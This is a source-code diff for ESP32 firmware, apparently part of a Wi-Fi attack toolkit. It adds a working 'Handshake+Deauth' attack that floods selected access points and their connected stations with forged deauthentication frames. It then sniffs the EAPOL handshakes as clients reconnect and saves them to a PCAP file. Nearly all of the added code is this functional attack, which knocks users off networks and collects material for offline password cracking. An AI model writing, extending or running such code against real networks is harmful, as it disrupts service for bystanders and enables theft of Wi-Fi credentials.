@@ -13,14 +13,18 @@
 
 #include "attacks/wifi/deauth_attack.h"
 #include "managers/wifi_manager.h"
+#include "core/system_manager.h"
 #include "managers/ap_manager.h"
 #include "managers/ghostchi_manager.h"
+#include "managers/ghostscript_runtime.h"
 #include "managers/rgb_manager.h"
 #include "managers/status_display_manager.h"
 #include "managers/views/terminal_screen.h"
+#include "core/callbacks.h"
 #include "core/glog.h"
 #include "scans/wifi/station_scan.h"
 #include "scans/wifi/wifi_channels.h"
+#include "vendor/pcap.h"
 #include "esp_wifi.h"
 #include "esp_random.h"
 #include "esp_timer.h"
@@ -31,14 +35,7 @@
 #include <inttypes.h>
 #include <stdlib.h>
 
-// Maximum WiFi channel
-#if !defined(MAX_WIFI_CHANNEL)
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-#define MAX_WIFI_CHANNEL 165
-#else
-#define MAX_WIFI_CHANNEL 13
-#endif
-#endif
+#include "core/network_constants.h"
 
 // Rate limiting
 #define MAX_PACKETS_PER_SECOND 500
@@ -56,9 +53,13 @@ static uint32_t deauth_packets_sent = 0;
 // Task handles (local to this module)
 static TaskHandle_t deauth_task_handle = NULL;
 static TaskHandle_t deauth_station_task_handle = NULL;
+static TaskHandle_t handshake_deauth_task_handle = NULL;
 static bool deauth_task_running = false;
 static volatile bool deauth_stop_requested = false;
 static volatile bool deauth_station_stop_requested = false;
+static volatile bool handshake_deauth_stop_requested = false;
+static bool handshake_deauth_task_running = false;
+static uint32_t handshake_deauth_handshake_count = 0;
 
 static station_ap_pair_t selected_station_local;
 static bool station_selected_local = false;
@@ -125,6 +126,7 @@ static const uint8_t disassoc_packet_template[26] = {
 // Forward declarations
 static void deauth_task(void *param);
 static void deauth_station_task(void *param);
+static void handshake_deauth_task(void *param);
 
 esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6]) {
     // Use HT40 for 5GHz channels on dual-band chips - but use NONE as secondary
@@ -378,7 +380,7 @@ void deauth_attack_start(void) {
         }
         
         deauth_stop_requested = false;
-        BaseType_t rc = xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
+        BaseType_t rc = xTaskCreate_psram(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
         if (rc != pdPASS) {
             glog("Failed to start deauth task (%ld)\n", (long)rc);
             status_display_show_status("Deauth Start Fail");
@@ -388,6 +390,9 @@ void deauth_attack_start(void) {
         }
         deauth_task_running = true;
         rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
+        char da_payload[16];
+        snprintf(da_payload, sizeof(da_payload), "%d", selected_ap_count_local);
+        ghostscript_emit_event("attack_started", "deauth");
     } else {
         glog("Deauth already running.\n");
     }
@@ -420,6 +425,7 @@ void deauth_attack_stop(void) {
         esp_wifi_stop();
         ap_manager_start_services();
         status_display_show_status("Deauth Stopped");
+        ghostscript_emit_event("attack_stopped", "deauth");
     } else {
         status_display_show_status("No Deauth Active");
     }
@@ -468,7 +474,7 @@ void deauth_attack_start_station(void) {
          selected_station_local.ap_bssid[0], selected_station_local.ap_bssid[1], selected_station_local.ap_bssid[2], 
          selected_station_local.ap_bssid[3], selected_station_local.ap_bssid[4], selected_station_local.ap_bssid[5]);
     deauth_station_stop_requested = false;
-    BaseType_t station_rc = xTaskCreate(deauth_station_task, "deauth_station", 4096, NULL, 5, &deauth_station_task_handle);
+    BaseType_t station_rc = xTaskCreate_psram(deauth_station_task, "deauth_station", 4096, NULL, 5, &deauth_station_task_handle);
     if (station_rc != pdPASS) {
         glog("Failed to start station deauth task (%ld)\n", (long)station_rc);
         status_display_show_status("Deauth Station Fail");
@@ -545,4 +551,290 @@ uint32_t deauth_attack_get_packets_sent(void) {
 
 void deauth_attack_reset_packet_counter(void) {
     deauth_packets_sent = 0;
+}
+
+// Combined handshake capture + deauth attack
+static void handshake_deauth_task(void *param) {
+    (void)param;
+
+    wifi_ap_record_t *ap_info = scanned_aps;
+    if (ap_info == NULL) {
+        glog("No AP info available\n");
+        handshake_deauth_task_running = false;
+        handshake_deauth_task_handle = NULL;
+        handshake_deauth_stop_requested = false;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    glog("Sending deauth bursts, listening for handshakes...\n");
+
+    uint32_t last_log = 0;
+    uint32_t burst_count = 0;
+    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+    while (!handshake_deauth_stop_requested) {
+        // Phase 1: Send deauth burst on each target
+        if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
+            for (int sel_idx = 0; sel_idx < selected_ap_count_local; sel_idx++) {
+                if (handshake_deauth_stop_requested) break;
+                for (int i = 0; i < ap_count; i++) {
+                    if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0) {
+                        int ch = ap_info[i].primary;
+                        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+                        // Short burst: 10 frames to each target
+                        for (int burst = 0; burst < 10; burst++) {
+                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
+                        }
+                        for (int j = 0; j < station_count; j++) {
+                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                                for (int burst = 0; burst < 10; burst++) {
+                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
+            for (int i = 0; i < ap_count; i++) {
+                if (handshake_deauth_stop_requested) break;
+                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap_local.ssid) == 0) {
+                    int ch = ap_info[i].primary;
+                    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+                    for (int burst = 0; burst < 10; burst++) {
+                        deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
+                    }
+                    for (int j = 0; j < station_count; j++) {
+                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                            for (int burst = 0; burst < 10; burst++) {
+                                deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        burst_count++;
+
+        // Phase 2: Listen for handshakes (2 second window)
+        // During this time the promiscuous callback captures EAPOL frames
+        for (int wait = 0; wait < 20 && !handshake_deauth_stop_requested; wait++) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
+
+        // Log stats every 5 bursts (~10 seconds)
+        if (burst_count % 5 == 0) {
+            glog("%" PRIu32 " bursts | %" PRIu32 " deauth pkts | %" PRIu32 " handshakes\n",
+                 burst_count, deauth_packets_sent, wifi_callbacks_get_handshake_count());
+            deauth_packets_sent = 0;
+        }
+    }
+
+    handshake_deauth_handshake_count = wifi_callbacks_get_handshake_count();
+    handshake_deauth_task_running = false;
+    handshake_deauth_stop_requested = false;
+    handshake_deauth_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+void deauth_attack_start_handshake_deauth(void) {
+    if (handshake_deauth_task_running) {
+        glog("Handshake+Deauth already running.\n");
+        return;
+    }
+
+    // Check if a station is selected first (like deauth_attack_start_station)
+    station_ap_pair_t hs_station;
+    bool hs_station_selected = station_scan_get_selection(&hs_station);
+
+    // If no station, check for selected AP
+    if (!hs_station_selected) {
+        extern wifi_ap_record_t selected_ap;
+        extern wifi_ap_record_t *selected_aps;
+        extern int selected_ap_count;
+
+        selected_ap_local = selected_ap;
+        selected_aps_local = selected_aps;
+        selected_ap_count_local = selected_ap_count;
+
+        if (selected_ap_count_local <= 0 && strlen((const char *)selected_ap_local.ssid) == 0) {
+            glog("No AP or station selected. Select a target first.\n");
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+            status_display_show_status("No Target Selected");
+#endif
+            return;
+        }
+    }
+
+    ap_manager_stop_services();
+    ghostchi_manager_add_xp(3);
+
+    // Ensure WiFi is fully stopped before configuring
+    esp_wifi_stop();
+    vTaskDelay(pdMS_TO_TICKS(50));
+
+    // Set protocols for dual-band chips (C5/C6) BEFORE starting WiFi to enable 5GHz
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    wifi_protocols_t p = {
+        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
+        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
+    };
+    esp_err_t proto_err = esp_wifi_set_protocols(WIFI_IF_AP, &p);
+    if (proto_err != ESP_OK) {
+        printf("Warning: Failed to set 5GHz protocols: %s\n", esp_err_to_name(proto_err));
+    } else {
+        printf("5GHz protocols set successfully\n");
+    }
+    ESP_ERROR_CHECK(esp_wifi_start());
+#else
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    esp_wifi_start();
+    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
+#endif
+    printf("Restarting Wi-Fi for Handshake+Deauth\n");
+
+    // Enable promiscuous mode for EAPOL capture (on top of AP mode)
+    wifi_callbacks_reset_handshake_tracking();
+    wifi_callbacks_set_pcap_enabled(true);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(wifi_eapol_scan_callback);
+
+    // Open PCAP file for EAPOL capture
+    int pcap_err = pcap_file_open("handshake_deauth", PCAP_CAPTURE_WIFI);
+    if (pcap_err != ESP_OK) {
+        glog("Warning: PCAP file failed to open, continuing without capture\n");
+    } else {
+        glog("PCAP capture enabled for handshake recording\n");
+    }
+
+    // Build country-appropriate channel list
+    wireshark_channels_count = wifi_channels_build_country_list(wireshark_channels, sizeof(wireshark_channels));
+
+    if (hs_station_selected) {
+        char sanitized_ssid[33];
+        bool found = false;
+        for (int i = 0; i < ap_count; i++) {
+            if (memcmp(scanned_aps[i].bssid, hs_station.ap_bssid, 6) == 0) {
+                sanitize_ssid(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
+                selected_ap_local = scanned_aps[i];
+                selected_aps_local = NULL;
+                selected_ap_count_local = 0;
+                found = true;
+                break;
+            }
+        }
+        if (!found) {
+            snprintf(sanitized_ssid, sizeof(sanitized_ssid), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     hs_station.ap_bssid[0], hs_station.ap_bssid[1], hs_station.ap_bssid[2],
+                     hs_station.ap_bssid[3], hs_station.ap_bssid[4], hs_station.ap_bssid[5]);
+            memset(&selected_ap_local, 0, sizeof(selected_ap_local));
+            memcpy(selected_ap_local.bssid, hs_station.ap_bssid, 6);
+            selected_ap_local.primary = 1;
+            selected_aps_local = NULL;
+            selected_ap_count_local = 0;
+        }
+        glog("Starting Handshake+Deauth on station (AP: %s)\n", sanitized_ssid);
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+        status_display_show_attack("HS+Deauth", sanitized_ssid);
+#endif
+    } else {
+        extern wifi_ap_record_t selected_ap;
+        extern wifi_ap_record_t *selected_aps;
+        extern int selected_ap_count;
+        selected_ap_local = selected_ap;
+        selected_aps_local = selected_aps;
+        selected_ap_count_local = selected_ap_count;
+
+        if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
+            glog("Starting Handshake+Deauth on %d APs:\n", selected_ap_count_local);
+            for (int i = 0; i < selected_ap_count_local; i++) {
+                char sanitized_ssid[33];
+                sanitize_ssid(selected_aps_local[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
+                glog("  [%d] %s\n", i, sanitized_ssid);
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+                if (i == 0) status_display_show_attack("HS+Deauth", sanitized_ssid);
+#endif
+            }
+        } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
+            char sanitized_ssid[33];
+            sanitize_ssid(selected_ap_local.ssid, sanitized_ssid, sizeof(sanitized_ssid));
+            glog("Starting Handshake+Deauth on: %s\n", sanitized_ssid);
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+            status_display_show_attack("HS+Deauth", sanitized_ssid);
+#endif
+        }
+    }
+
+    handshake_deauth_handshake_count = 0;
+
+    if (handshake_deauth_stop_requested) {
+        glog("Handshake+Deauth cancelled before start.\n");
+        handshake_deauth_stop_requested = false;
+        esp_wifi_set_promiscuous(false);
+        pcap_file_close();
+        esp_wifi_stop();
+        ap_manager_start_services();
+        return;
+    }
+
+    BaseType_t rc = xTaskCreate_psram(handshake_deauth_task, "hs_deauth_task", 4096, NULL, 5, &handshake_deauth_task_handle);
+    if (rc != pdPASS) {
+        glog("Failed to start handshake+deauth task (%ld)\n", (long)rc);
+        status_display_show_status("HS+Deauth Fail");
+        handshake_deauth_task_handle = NULL;
+        handshake_deauth_stop_requested = false;
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_stop();
+        ap_manager_start_services();
+        return;
+    }
+    handshake_deauth_task_running = true;
+    rgb_manager_set_color(&rgb_manager, -1, 255, 128, 0, false);
+    ghostscript_emit_event("attack_started", "handshake_deauth");
+    glog("Handshake+Deauth running. Use 'stopdeauth' or 'stop' to end.\n");
+}
+
+bool deauth_attack_stop_handshake_deauth(void) {
+    handshake_deauth_stop_requested = true;
+
+    if (!handshake_deauth_task_running) {
+        return false;
+    }
+
+    glog("Stopping Handshake+Deauth...\n");
+    status_display_show_status("HS+Deauth Stop");
+
+    if (handshake_deauth_task_handle != NULL) {
+        int wait_count = 0;
+        while (handshake_deauth_task_handle != NULL && wait_count < 100) {
+            vTaskDelay(pdMS_TO_TICKS(10));
+            wait_count++;
+        }
+
+        if (handshake_deauth_task_handle != NULL) {
+            glog("Handshake+Deauth stop timeout; waiting for task to exit\n");
+        }
+    }
+
+    // Stop promiscuous mode and close PCAP
+    esp_wifi_set_promiscuous(false);
+    pcap_file_close();
+
+    handshake_deauth_task_running = false;
+    handshake_deauth_stop_requested = false;
+    rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
+    esp_wifi_stop();
+    ap_manager_start_services();
+    status_display_show_status("HS+Deauth Stopped");
+
+    glog("Handshake+Deauth stopped. %" PRIu32 " handshakes captured.\n", handshake_deauth_handshake_count);
+    ghostscript_emit_event("attack_stopped", "handshake_deauth");
+    return true;
+}
+
+bool deauth_attack_handshake_deauth_is_running(void) {
+    return handshake_deauth_task_running;
 }
